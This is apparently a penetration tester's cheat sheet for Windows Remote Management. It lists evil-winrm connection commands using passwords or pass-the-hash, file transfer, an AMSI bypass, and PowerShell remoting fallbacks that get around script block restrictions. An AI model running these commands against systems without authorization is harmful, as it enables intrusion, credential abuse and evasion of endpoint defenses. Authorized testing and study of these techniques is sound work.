## Win RM (port 5985 by default)

### Install and connect

**Here, check in which group the user belongs to see if it can connect remotely**
- `gem install evil-winrm`
- `evil-winrm -u <user> -p <password> -i <ip>`
- use a hash : `<evil-winrm <ip> -u <user> -H <hash> -i <ip>`


### Download and upload files

- `upload` command or `download`. Always use absolute path.

### Bypass AMSI

```
menu
Bypass-4MSI
```


## When it doesn't work

- Install powershell on Linux and gss-ntlmssp
- `Enter-PSSession -Computer <ip> -credential <hostname>\\<user> -Authentication Negotiate`
- if trying commands like `dir`, `ls` ... doesn't work, there may be script block, so use `&{ ls }`